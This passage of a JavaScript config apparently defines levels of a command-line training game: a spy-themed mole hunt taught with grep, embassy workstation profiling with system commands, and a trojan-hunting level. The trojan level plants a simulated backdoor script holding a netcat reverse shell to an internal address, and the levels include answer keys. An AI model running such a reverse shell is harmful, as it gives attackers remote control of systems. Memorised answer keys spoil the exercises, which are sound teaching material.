grep "ZONE-ALPHA" personnel/operators.txt
cat operations/ops_inactive.txt
grep "SECTOR-7" operations/zones.txt
grep "NIGHTFALL" operations/assignments.txt
cat personnel/operators.txt | grep "ZONE-ALPHA" | grep -v "ACTIVE"
ls -la /tmp`
                },
                '/home/analyst/.molehunt_cheatsheet': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'analyst',
                    group: 'analyst',
                    size: 1024,
                    content: `╔═══════════════════════════════════════════════════════════════╗
║              MOLE HUNT INVESTIGATION CHEATSHEET               ║
╚═══════════════════════════════════════════════════════════════╝

FILTERING DATA
──────────────
grep "PATTERN" file              Find lines matching pattern
grep -v "PATTERN" file           Find lines NOT matching pattern
grep -i "pattern" file           Case-insensitive search

CHAINING COMMANDS (PIPES)
─────────────────────────
cmd1 | cmd2                      Send output of cmd1 to cmd2
grep "A" file | grep "B"         Find lines with BOTH A and B
grep "X" file | grep -v "Y"      Find X but exclude Y

CROSS-REFERENCING
─────────────────
grep "NAME" file1                Find person in file1
grep "OPERATION" file2           Find operation details in file2

SAVING RESULTS
──────────────
grep "pattern" file > output     Save results to file
cat file1 file2 > combined       Combine files

EXAMPLE WORKFLOW
────────────────
# Find operators with ZONE-ALPHA clearance
grep "ZONE-ALPHA" personnel/operators.txt

# Find who was on NIGHTFALL operation
grep "NIGHTFALL" operations/assignments.txt

# Chain: ZONE-ALPHA operators NOT on active ops
grep "ZONE-ALPHA" personnel/operators.txt | grep -v "ACTIVE-OP"

HIDDEN FILES: Use ls -la to find hidden directories!`
                },
                '/home/analyst/workspace': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'analyst',
                    group: 'analyst',
                    children: ['README.txt']
                },
                '/home/analyst/workspace/README.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'analyst',
                    group: 'analyst',
                    size: 256,
                    content: `WORKSPACE DIRECTORY
===================
Use this directory to save your investigation findings.

Example:
  grep "ZONE-ALPHA" /evidence/personnel/operators.txt > workspace/alpha_cleared.txt
  grep "NIGHTFALL" /evidence/operations/assignments.txt > workspace/nightfall_team.txt`
                },
                '/evidence': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'root',
                    group: 'intel',
                    children: ['personnel', 'operations', 'intel']
                },
                '/evidence/personnel': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'root',
                    group: 'intel',
                    children: ['operators.txt', 'clearances.txt']
                },
                '/evidence/personnel/operators.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'root',
                    group: 'intel',
                    size: 4096,
                    content: `FIELD OPERATORS ROSTER - CLASSIFIED
====================================
FORMAT: CODENAME | CLEARANCE | CURRENT-STATUS

APEX        | ZONE-ALPHA | ACTIVE-OP:THUNDER
ARCHER      | ZONE-BETA  | ACTIVE-OP:SENTINEL
ARROW       | ZONE-BETA  | STANDBY
AVALANCHE   | ZONE-GAMMA | ACTIVE-OP:ECLIPSE
BANDIT      | ZONE-DELTA | STANDBY
BISHOP      | ZONE-GAMMA | ACTIVE-OP:HORIZON
BLADE       | ZONE-BETA  | ACTIVE-OP:PHANTOM
BLAZE       | ZONE-BETA  | STANDBY
BOLT        | ZONE-DELTA | ACTIVE-OP:RAPTOR
BRAVO       | ZONE-GAMMA | STANDBY
BULLET      | ZONE-BETA  | ACTIVE-OP:STORM
CASTLE      | ZONE-DELTA | STANDBY
CIPHER      | ZONE-ALPHA | STANDBY
COBRA       | ZONE-DELTA | ACTIVE-OP:VANGUARD
CONDOR      | ZONE-GAMMA | STANDBY
CORONA      | ZONE-ALPHA | ACTIVE-OP:ORACLE
COYOTE      | ZONE-BETA  | STANDBY
CROSS       | ZONE-GAMMA | ACTIVE-OP:SPECTRUM
DAGGER      | ZONE-BETA  | ACTIVE-OP:SENTINEL
DRAGON      | ZONE-GAMMA | STANDBY
EAGLE       | ZONE-ALPHA | ACTIVE-OP:THUNDER
FALCON      | ZONE-BETA  | STANDBY
FANG        | ZONE-DELTA | ACTIVE-OP:AVALANCHE
FROST       | ZONE-BETA  | ACTIVE-OP:ECLIPSE
GHOST       | ZONE-GAMMA | STANDBY
GRIFFIN     | ZONE-GAMMA | ACTIVE-OP:HORIZON
HAWK        | ZONE-ALPHA | ACTIVE-OP:THUNDER
HUNTER      | ZONE-BETA  | STANDBY
HYDRA       | ZONE-GAMMA | ACTIVE-OP:SPECTRUM
JAGUAR      | ZONE-DELTA | STANDBY
KNIGHT      | ZONE-GAMMA | ACTIVE-OP:ORACLE
LANCE       | ZONE-BETA  | STANDBY
LEOPARD     | ZONE-DELTA | ACTIVE-OP:RAPTOR
LION        | ZONE-DELTA | STANDBY
MAVERICK    | ZONE-BETA  | ACTIVE-OP:PHANTOM
MYSTIC      | ZONE-GAMMA | STANDBY
NOMAD       | ZONE-ALPHA | STANDBY
ORACLE      | ZONE-GAMMA | STANDBY
PANTHER     | ZONE-DELTA | ACTIVE-OP:STORM
PHOENIX     | ZONE-GAMMA | STANDBY
PRISM       | ZONE-ALPHA | ACTIVE-OP:SENTINEL
PYTHON      | ZONE-DELTA | STANDBY
RANGER      | ZONE-BETA  | ACTIVE-OP:VANGUARD
RAVEN       | ZONE-BETA  | STANDBY
REAPER      | ZONE-GAMMA | ACTIVE-OP:AVALANCHE
SABER       | ZONE-BETA  | STANDBY
SCOUT       | ZONE-BETA  | ACTIVE-OP:HORIZON
SERPENT     | ZONE-GAMMA | STANDBY
SHADOW      | ZONE-GAMMA | STANDBY
SHARK       | ZONE-DELTA | STANDBY
SIERRA      | ZONE-BETA  | ACTIVE-OP:SPECTRUM
SPECTER     | ZONE-GAMMA | ACTIVE-OP:ORACLE
SPHINX      | ZONE-GAMMA | STANDBY
STORM       | ZONE-BETA  | STANDBY
STRIKER     | ZONE-BETA  | ACTIVE-OP:RAPTOR
TALON       | ZONE-DELTA | ACTIVE-OP:ECLIPSE
TIGER       | ZONE-DELTA | STANDBY
TITAN       | ZONE-ALPHA | ACTIVE-OP:PHANTOM
TRACKER     | ZONE-BETA  | STANDBY
VENOM       | ZONE-DELTA | ACTIVE-OP:THUNDER
VERTEX      | ZONE-ALPHA | ACTIVE-OP:STORM
VIPER       | ZONE-ALPHA | STANDBY
WOLF        | ZONE-ALPHA | ACTIVE-OP:SENTINEL
WRAITH      | ZONE-GAMMA | STANDBY
ZENITH      | ZONE-ALPHA | ACTIVE-OP:VANGUARD

[END OF ROSTER - 65 OPERATORS]`
                },
                '/evidence/personnel/clearances.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'root',
                    group: 'intel',
                    size: 512,
                    content: `SECURITY CLEARANCE LEVELS
=========================

ZONE-ALPHA: Highest clearance. Access to all sectors.
            Can be assigned to any operation worldwide.
            Total operators: 12

ZONE-BETA:  Standard field clearance. Most common.
            Limited to non-critical sectors.
            Total operators: 22

ZONE-GAMMA: Specialist clearance. Technical operations.
            Cyber, signals intelligence, analysis.
            Total operators: 18

ZONE-DELTA: Support clearance. Logistics and backup.
            Cannot lead operations.
            Total operators: 13

NOTE: Only ZONE-ALPHA personnel had access to SECTOR-7 operations.`
                },
                '/evidence/operations': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'root',
                    group: 'intel',
                    children: ['assignments.txt', 'ops_active.txt', 'ops_inactive.txt', 'zones.txt']
                },
                '/evidence/operations/assignments.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'root',
                    group: 'intel',
                    size: 2048,
                    content: `OPERATION ASSIGNMENTS - HISTORICAL RECORD
==========================================
FORMAT: OPERATION | ASSIGNED OPERATORS

NIGHTFALL   | CIPHER, HAWK, NOMAD, PHOENIX, RAVEN, SHADOW, VIPER, WOLF
DARKSTAR    | APEX, DRAGON, FROST, GHOST, MYSTIC, SERPENT
WHISPER     | ARROW, BISHOP, COBRA, GRIFFIN, LANCE, LION
BLACKOUT    | CONDOR, COYOTE, DAGGER, ORACLE, SPHINX, WRAITH
WINTER-SUN  | BANDIT, BLAZE, BRAVO, HUNTER, JAGUAR, STORM
GHOSTLIGHT  | CASTLE, FALCON, PANTHER, PYTHON, SABER, SHARK
COBRA-STRIKE| KNIGHT, LEOPARD, MAVERICK, RANGER, REAPER, TIGER
RAVEN-EYE   | BULLET, CROSS, SCOUT, SIERRA, STRIKER, TRACKER

THUNDER     | APEX, EAGLE, HAWK, VENOM
SENTINEL    | ARCHER, DAGGER, PRISM, WOLF
ECLIPSE     | AVALANCHE, FROST, TALON
PHANTOM     | BLADE, MAVERICK, TITAN
HORIZON     | BISHOP, GRIFFIN, SCOUT
RAPTOR      | BOLT, LEOPARD, STRIKER
STORM       | BULLET, PANTHER, VERTEX
VANGUARD    | COBRA, RANGER, ZENITH
ORACLE      | CORONA, KNIGHT, SPECTER
SPECTRUM    | CROSS, HYDRA, SIERRA
AVALANCHE   | FANG, REAPER

[END OF ASSIGNMENTS]`
                },
                '/evidence/operations/ops_active.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'root',
                    group: 'intel',
                    size: 1024,
                    content: `ACTIVE OPERATIONS
=================
Status: Currently running, personnel deployed

OPERATION    | SECTOR    | STATUS      | TEAM SIZE
─────────────────────────────────────────────────────
THUNDER      | SECTOR-2  | ACTIVE      | 4
SENTINEL     | SECTOR-4  | ACTIVE      | 4
ECLIPSE      | SECTOR-1  | ACTIVE      | 3
PHANTOM      | SECTOR-3  | ACTIVE      | 3
HORIZON      | SECTOR-5  | ACTIVE      | 3
RAPTOR       | SECTOR-2  | ACTIVE      | 3
STORM        | SECTOR-6  | ACTIVE      | 3
VANGUARD     | SECTOR-4  | ACTIVE      | 3
ORACLE       | SECTOR-1  | ACTIVE      | 3
SPECTRUM     | SECTOR-3  | ACTIVE      | 3
AVALANCHE    | SECTOR-5  | ACTIVE      | 2

Total Active Operations: 11
Total Deployed Personnel: 34`
                },
                '/evidence/operations/ops_inactive.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'root',
                    group: 'intel',
                    size: 1536,
                    content: `INACTIVE OPERATIONS
===================
Status: Terminated, compromised, or completed

OPERATION    | SECTOR    | STATUS       | TERMINATION REASON
──────────────────────────────────────────────────────────────
NIGHTFALL    | SECTOR-7  | COMPROMISED  | Intelligence leak - op burned
DARKSTAR     | SECTOR-3  | COMPLETED    | Objectives achieved
WHISPER      | SECTOR-1  | COMPLETED    | Objectives achieved
BLACKOUT     | SECTOR-6  | COMPROMISED  | Cover blown - Loss of assets
WINTER-SUN   | SECTOR-2  | COMPLETED    | Objectives achieved
GHOSTLIGHT   | SECTOR-4  | COMPLETED    | Objectives achieved
COBRA-STRIKE | SECTOR-5  | COMPROMISED  | Ambush - possible leak
RAVEN-EYE    | SECTOR-8  | COMPLETED    | Objectives achieved

*** PRIORITY INVESTIGATION: NIGHTFALL ***
Operation NIGHTFALL in SECTOR-7 was catastrophically compromised.
All assets burned. Enemy had advance warning.
STRONG INDICATION OF INSIDER THREAT.

Total Inactive Operations: 8
Compromised Operations: 3 (NIGHTFALL, BLACKOUT, COBRA-STRIKE)`
                },
                '/evidence/operations/zones.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'root',
                    group: 'intel',
                    size: 1024,
                    content: `OPERATIONAL ZONES - SECTOR ASSIGNMENTS
=======================================

SECTOR-1: Eastern Europe
  - Active: ECLIPSE, ORACLE
  - Inactive: WHISPER (completed)

SECTOR-2: Western Europe
  - Active: THUNDER, RAPTOR
  - Inactive: WINTER-SUN (completed)

SECTOR-3: Middle East
  - Active: PHANTOM, SPECTRUM
  - Inactive: DARKSTAR (completed)

SECTOR-4: Asia Pacific
  - Active: SENTINEL, VANGUARD
  - Inactive: GHOSTLIGHT (completed)

SECTOR-5: Africa
  - Active: HORIZON, AVALANCHE
  - Inactive: COBRA-STRIKE (COMPROMISED)

SECTOR-6: South America
  - Active: STORM
  - Inactive: BLACKOUT (COMPROMISED)

SECTOR-7: North America (RESTRICTED) - Op NIGHTFALL [COMPROMISED]
  - Active: NONE
  - Inactive: NIGHTFALL *** CRITICAL - INVESTIGATE ***

SECTOR-8: Oceania
  - Active: NONE
  - Inactive: RAVEN-EYE (completed)

NOTE: SECTOR-7 operations require ZONE-ALPHA clearance.`
                },
                '/evidence/intel': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'root',
                    group: 'intel',
                    children: ['constraints.txt', 'source_report.txt', 'timeline.txt', '.I_QUIT']
                },
                '/evidence/intel/.I_QUIT': {
                    type: 'dir',
                    perms: 'drwx------',
                    owner: 'analyst',
                    group: 'intel',
                    children: ['notes.txt']
                },
                '/evidence/intel/.I_QUIT/notes.txt': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'analyst',
                    group: 'intel',
                    size: 1024,
                    content: `I QUIT. I'M DONE. THREE WEEKS ON THIS CASE.
=============================================

To whoever picks this up after me:

I've done the work. I've narrowed it down. Here's where I got:

STEP 1: SECTOR-7 operation = NIGHTFALL (compromised)
STEP 2: NIGHTFALL team = 8 operators
STEP 3: Filter by ZONE-ALPHA clearance = 5 remain
STEP 4: Filter by STANDBY (not on active ops) = 3 remain

THE THREE SUSPECTS:
  → CIPHER
  → NOMAD
  → VIPER

One of these three is the traitor. I'M CERTAIN OF IT.

The intercept signature is just "N" but I can't get confirmation
on which one. Cross-reference with the signature and you'll have
your answer. It's RIGHT THERE.

I can't do this anymore. The paranoia is getting to me.
Everyone looks like a suspect now.

Format your report as: SUSPECTS:TRAITOR (alphabetical order)

Good luck. You'll need it.

- Former Analyst Martinez
  (P.S. - Check /tmp if you haven't already. Hidden dead drops.)`
                },
                '/evidence/intel/constraints.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'root',
                    group: 'intel',
                    size: 1024,
                    content: `╔═══════════════════════════════════════════════════════════════╗
║           TRAITOR PROFILE - CONFIRMED CONSTRAINTS             ║
╚═══════════════════════════════════════════════════════════════╝

Source: HUMINT asset CARDINAL (reliability: A+)
Date: 2026-01-15
Classification: TOP SECRET

The traitor matches ALL of the following criteria:

┌─────────────────────────────────────────────────────────────┐
│ CONSTRAINT 1: OPERATION HISTORY                             │
│ The traitor was assigned to an operation that is now        │
│ INACTIVE (compromised or completed).                        │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ CONSTRAINT 2: SECURITY CLEARANCE                            │
│ The traitor has ZONE-ALPHA security clearance.              │
│ (Only 12 operators have this level)                         │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ CONSTRAINT 3: SECTOR INVOLVEMENT                            │
│ The traitor's compromised operation was in SECTOR-7.        │
│ (Check zones.txt for SECTOR-7 operations)                   │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ CONSTRAINT 4: CURRENT STATUS                                │
│ The traitor is NOT currently assigned to any ACTIVE op.     │
│ (Check operators.txt - should show STANDBY, not ACTIVE-OP)  │
└─────────────────────────────────────────────────────────────┘

ANALYSIS APPROACH:
1. Find operation in SECTOR-7 that went INACTIVE
2. Get list of operators assigned to that operation
3. Filter by ZONE-ALPHA clearance
4. Exclude anyone currently on ACTIVE operations
5. Result should be exactly 3 SUSPECTS

Then find the smoking gun to identify the actual traitor.
Check EVERYWHERE. Some evidence may be HIDDEN.`
                },
                '/evidence/intel/source_report.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'root',
                    group: 'intel',
                    size: 768,
                    content: `INTELLIGENCE SOURCE REPORT
==========================
Asset: CARDINAL
Handler: CONTROL
Date: 2026-01-14

CARDINAL reports contact with enemy handler who boasted
about having "a friend in high places" within our organization.

Enemy handler indicated:
- The mole provided advance warning about NIGHTFALL
- The mole has top-tier access (ZONE-ALPHA confirmed)
- The mole is currently "lying low" (not on active operations)
- Communications occur via dead drop in /tmp directory

CARDINAL was unable to obtain the mole's identity directly.
However, the profile constraints should narrow the field
to a small number of suspects.

RECOMMENDATION:
Cross-reference all personnel against the constraints.
Search for hidden communications evidence.

CARDINAL adds: "The walls have ears. The mole knows you're looking."

[END REPORT]`
                },
                '/evidence/intel/timeline.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'root',
                    group: 'intel',
                    size: 512,
                    content: `OPERATION NIGHTFALL - COMPROMISE TIMELINE
==========================================

2026-01-05: NIGHTFALL team inserted into SECTOR-7
2026-01-07: First check-in, all nominal
2026-01-09: Team reports being surveilled
2026-01-10: Safe house compromised, team scattered
2026-01-11: Asset CARDINAL captured (later rescued)
2026-01-12: NIGHTFALL officially terminated
2026-01-13: Counter-intel launched investigation
2026-01-14: CARDINAL provides traitor profile
2026-01-15: YOU ARE HERE - Identify the mole

The enemy knew our moves before we made them.
This was an inside job. Find the traitor.`
                },
                '/tmp': {
                    type: 'dir',
                    perms: 'drwxrwxrwt',
                    owner: 'root',
                    group: 'root',
                    children: ['cache', '.dead_drop']
                },
                '/tmp/cache': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'root',
                    group: 'root',
                    children: ['readme.txt']
                },
                '/tmp/cache/readme.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'root',
                    group: 'root',
                    size: 64,
                    content: `System cache directory. Nothing interesting here.`
                },
                '/tmp/.dead_drop': {
                    type: 'dir',
                    perms: 'drwx------',
                    owner: 'root',
                    group: 'root',
                    children: ['intercept.log']
                },
                '/tmp/.dead_drop/intercept.log': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'root',
                    group: 'root',
                    size: 1024,
                    content: `╔═══════════════════════════════════════════════════════════════╗
║        INTERCEPTED COMMUNICATIONS - TOP SECRET                ║
╚═══════════════════════════════════════════════════════════════╝

SIGINT INTERCEPT #4471
Date: 2026-01-09 03:42:17 UTC
Frequency: Encrypted burst transmission
Decryption: PARTIAL

───────────────────────────────────────────────────────────────
FROM: [INTERNAL - COUNTER-INTEL TRACE CONFIRMS OUR NETWORK]
TO: ENEMY HANDLER (codename: ROOK)
───────────────────────────────────────────────────────────────

ROOK,

NIGHTFALL team arriving at waypoint BRAVO tomorrow 0600.
Suggest interdiction at grid reference [REDACTED].
Payment as agreed. CARDINAL is the priority target.

The others suspect nothing. They trust me completely.

Will go dark after this. Too much heat.
Contact via usual dead drop when clear.

- N

───────────────────────────────────────────────────────────────
ANALYSIS: Signature "N" consistent with single letter codename
initial. Cross-reference with NIGHTFALL team roster.
PROBABLE TRAITOR: Codename begins with "N"
───────────────────────────────────────────────────────────────

[END INTERCEPT]`
                },
            },

            // OUTCOME-BASED OBJECTIVES - check what they FOUND, not how they found it
            objectives: [
                {
                    id: 1,
                    task: 'Identify the compromised SECTOR-7 operation',
                    hint: 'Which operation in SECTOR-7 was compromised?',
                    check: (cmd, state, output) => output && output.includes('NIGHTFALL')
                },
                {
                    id: 2,
                    task: 'Obtain the NIGHTFALL team roster',
                    hint: 'Who was assigned to Operation NIGHTFALL?',
                    check: (cmd, state, output) => output && output.includes('CIPHER') && output.includes('NOMAD') && output.includes('VIPER')
                },
                {
                    id: 3,
                    task: 'Narrow to ZONE-ALPHA operators on STANDBY',
                    hint: 'Cross-reference clearance level with current status',
                    check: (cmd, state, output) => output && output.includes('ZONE-ALPHA') && output.includes('STANDBY')
                },
                {
                    id: 4,
                    task: 'Locate the hidden dead drop',
                    hint: 'Field operatives sometimes leave evidence in unexpected places',
                    check: (cmd, state, output) => output && output.includes('.dead_drop')
                },
                {
                    id: 5,
                    task: 'Recover the smoking gun evidence',
                    hint: 'The intercepted communication reveals the traitor\'s signature',
                    check: (cmd, state, output) => output && output.includes('- N')
                },
            ],

            // Insight Phase - Compounded Answer
            insightPhase: {
                enabled: true,
                question: "Enter your findings in format: SUSPECT1,SUSPECT2,SUSPECT3:TRAITOR (suspects alphabetical)",
                hint: "NIGHTFALL team + ZONE-ALPHA + STANDBY = 3 suspects. The intercept signature reveals which one.",
                hintAfterAttempts: 3,
                acceptedAnswers: ['CIPHER,NOMAD,VIPER:NOMAD', 'cipher,nomad,viper:nomad', 'CIPHER, NOMAD, VIPER:NOMAD', 'CIPHER,NOMAD,VIPER: NOMAD'],
                correctAnswerMessage: 'Intel confirmed. NOMAD is the traitor. Suspects CIPHER, NOMAD, and VIPER flagged — intercept signature "N" matches NOMAD. Excellent fieldwork, analyst.',
                wrongAnswerMessage: 'Negative. Review your findings and try again.',
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-016: System Intel
        // Theme: Embassy workstation profiling before implant deployment
        // ──────────────────────────────────────────────────────────
        'CLH-016': {
            title: 'System Intel',
            description: 'Profile a compromised embassy workstation before deploying collection tools.',
            prerequisites: ['CLH-015'],
            tier: 'CLI Specter',
            user: 'operator',
            hostname: 'EMBASSY-WS-07',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
                    children: ['.ssh', 'intel', 'tools', '.bashrc', '.bash_history', '.sysinfo_cheatsheet']
                },
                '/home/operator/.ssh': {
                    type: 'dir', perms: 'drwx------', owner: 'operator', group: 'operator',
                    children: ['id_rsa', 'id_rsa.pub', 'known_hosts']
                },
                '/home/operator/.ssh/id_rsa': {
                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator', size: 1675,
                    content: '-----BEGIN OPENSSH PRIVATE KEY-----\n[REDACTED - OPERATIONAL KEY]\n-----END OPENSSH PRIVATE KEY-----'
                },
                '/home/operator/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator', size: 78,
                    content: `uname -a
lscpu
free -h
df -h
du -sh /home`
                },
                '/home/operator/.sysinfo_cheatsheet': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 512,
                    content: `╔═══════════════════════════════════════════════════════════════╗
║          SYSTEM PROFILING CHEATSHEET                          ║
╚═══════════════════════════════════════════════════════════════╝

ARCHITECTURE INFO
────────────────
uname -a             Full system info
uname -r             Kernel version
arch                 CPU architecture
hostnamectl          System/OS details

CPU PROFILING
────────────
lscpu                CPU architecture info
nproc                Number of processors
cat /proc/cpuinfo    Detailed CPU info

MEMORY ASSESSMENT
────────────────
free -h              Human-readable memory
cat /proc/meminfo    Detailed memory info
vmstat               Virtual memory stats

DISK ANALYSIS
────────────
df -h                Filesystem space
du -sh /path         Directory size
lsblk                Block devices
fdisk -l             Disk partitions`
                },
                '/home/operator/intel': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
                    children: ['notes.txt', 'targets.list']
                },
                '/home/operator/intel/notes.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 256,
                    content: 'OPERATION IRON HARVEST\n======================\nTarget: Embassy IT Admin Workstation\nAccess: SSH key compromise\nObjective: Profile system for implant deployment\n'
                },
                '/home/operator/intel/targets.list': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 189,
                    content: `HIGH VALUE TARGETS
==================
/home/ambassador/.classified/
/data/diplomatic-cables/
/data/backups/

SECONDARY TARGETS
=================
/home/attache/reports/
/home/attache/schedules/`
                },
                '/home/operator/tools': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
                    children: ['recon.sh', 'exfil.py']
                },
                '/home/operator/tools/recon.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'operator', group: 'operator', size: 256,
                    content: `#!/bin/bash
# System profiling script
echo "=== SYSTEM PROFILE ==="
uname -a
echo "=== CPU ==="
lscpu | head -5
echo "=== MEMORY ==="
free -h
echo "=== DISK ==="
df -h`
                },
                '/home/ambassador': {
                    type: 'dir', perms: 'drwxr-x---', owner: 'ambassador', group: 'ambassador',
                    children: ['documents', 'emails', '.classified']
                },
                '/home/ambassador/.classified': {
                    type: 'dir', perms: 'drwx------', owner: 'ambassador', group: 'ambassador',
                    children: ['MAJESTIC-12.pdf', 'TREATY-DRAFT.doc', 'ASSET-LIST.xlsx']
                },
                '/home/attache': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'attache', group: 'attache',
                    children: ['reports', 'schedules']
                },
                '/data': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['backups', 'archives', 'diplomatic-cables']
                },
                '/data/diplomatic-cables': {
                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'staff',
                    children: ['2024-Q1', '2024-Q2', '2024-Q3', '2024-Q4']
                },
            },

            objectives: [
                { id: 1, task: 'IDENTIFY: System Architecture', hint: '$ uname -a',
                  check: (cmd, state, output) => cmd.includes('uname') && output && output.includes('Linux') },
                { id: 2, task: 'PROFILE: CPU Capabilities', hint: '$ lscpu',
                  check: (cmd, state, output) => cmd.includes('lscpu') && output && output.includes('CPU') },
                { id: 3, task: 'ASSESS: Memory Resources', hint: '$ free -h',
                  check: (cmd, state, output) => cmd.includes('free') && output && output.includes('Mem') },
                { id: 4, task: 'ANALYZE: Disk Space', hint: '$ df -h',
                  check: (cmd, state, output) => cmd.includes('df') && output && output.includes('Filesystem') },
                { id: 5, task: 'ESTIMATE: Target Directory Size', hint: '$ du -sh /home',
                  check: (cmd, state, output) => cmd.includes('du') && cmd.includes('/home') && output && /\d/.test(output) },
            ],

            // Insight Phase
            insightPhase: {
                enabled: true,
                question: "What is the operation codename according to the intel notes?",
                hint: "Check the notes.txt file in the intel directory.",
                hintAfterAttempts: 3,
                acceptedAnswers: ['IRON HARVEST', 'iron harvest', 'Iron Harvest', 'OPERATION IRON HARVEST'],
                correctAnswerMessage: 'Intel confirmed. Operation IRON HARVEST — embassy workstation profiled for implant deployment.',
                wrongAnswerMessage: 'Negative. Review your findings and try again.',
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-017: Find & Locate
        // Theme: Mole hunt - finding hidden files and backdoors
        // ──────────────────────────────────────────────────────────
        'CLH-017': {
            title: 'Find & Locate',
            description: 'Hunt for trojans and hidden files planted by a mole on a compromised system.',
            prerequisites: ['CLH-016'],
            tier: 'CLI Specter',
            user: 'hunter',
            hostname: 'BLACKSITE-7',
            startDir: '/home/hunter',
            allowedCommands: null,

            filesystem: {
                '/home/hunter': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'hunter', group: 'hunter',
                    children: ['toolkit', 'reports', '.bashrc', '.bash_history', '.find_cheatsheet']
                },
                '/home/hunter/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'hunter', group: 'hunter', size: 156,
                    content: `find /home -name ".*" -type f
find / -perm -4000 2>/dev/null
find /tmp -type f
find / -mtime -1 -type f 2>/dev/null
which sudo`
                },
                '/home/hunter/.find_cheatsheet': {
                    type: 'file', perms: '-rw-r--r--', owner: 'hunter', group: 'hunter', size: 678,
                    content: `╔═══════════════════════════════════════════════════════════════╗
║          FILE HUNTING CHEATSHEET                              ║
╚═══════════════════════════════════════════════════════════════╝

FIND BY NAME
────────────
find /path -name "filename"       Exact match
find /path -name "*.log"          Wildcard match
find /path -name ".*"             Hidden files (dot files)
find /path -iname "file"          Case-insensitive

FIND BY TYPE
───────────
find /path -type f                Regular files only
find /path -type d                Directories only
find /path -type l                Symbolic links

FIND BY PERMISSIONS
──────────────────
find / -perm -4000                SUID files (priv esc)
find / -perm -2000                SGID files
find / -perm -o+w                 World-writable files

FIND BY TIME
───────────
find / -mtime -1                  Modified in last 24h
find / -mtime +30                 Modified 30+ days ago
find / -atime -7                  Accessed in last week
find / -newer /etc/passwd         Newer than reference file

LOCATE (Fast Index Search)
─────────────────────────
locate filename                   Search index
whereis command                   Find binary/man pages
which command                     Find executable path`
                },
                '/home/hunter/toolkit': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'hunter', group: 'hunter',
                    children: ['scanner.sh', 'hasher.py']
                },
                '/home/hunter/toolkit/scanner.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'hunter', group: 'hunter', size: 256,
                    content: `#!/bin/bash
# Threat hunting scanner
echo "=== SUID FILES ==="
find / -perm -4000 2>/dev/null
echo "=== HIDDEN FILES ==="
find /home -name ".*" -type f
echo "=== RECENT CHANGES ==="
find / -mtime -1 -type f 2>/dev/null`
                },
                '/home/hunter/reports': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'hunter', group: 'hunter',
                    children: ['README.txt']
                },
                '/home/hunter/reports/README.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'hunter', group: 'hunter', size: 89,
                    content: 'Save your threat findings here.\nExample: find /tmp -type f > reports/tmp_files.txt'
                },
                '/home/analyst': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
                    children: ['.bashrc', '.secret_keys', '.backdoor.sh', '.classified']
                },
                '/home/analyst/.secret_keys': {
                    type: 'file', perms: '-rw-------', owner: 'analyst', group: 'analyst', size: 512,
                    content: '[SUSPICIOUS] API keys and credentials stored in hidden file'
                },
                '/home/analyst/.backdoor.sh': {
                    type: 'file', perms: '-rwx------', owner: 'analyst', group: 'analyst', size: 1024,
                    content: '#!/bin/bash\n# TROJAN - Reverse shell to mole C2\nnc -e /bin/bash 10.0.0.88 4444'
                },
                '/home/mole': {
                    type: 'dir', perms: 'drwx------', owner: 'mole', group: 'mole',
                    children: ['.exfil_staging', '.local']
                },
                '/home/mole/.exfil_staging': {
                    type: 'dir', perms: 'drwx------', owner: 'mole', group: 'mole',
                    children: ['classified_docs.tar.gz']
                },
                '/home/mole/.local': {
                    type: 'dir', perms: 'drwx------', owner: 'mole', group: 'mole',
                    children: ['pwn']
                },
                '/home/mole/.local/pwn': {
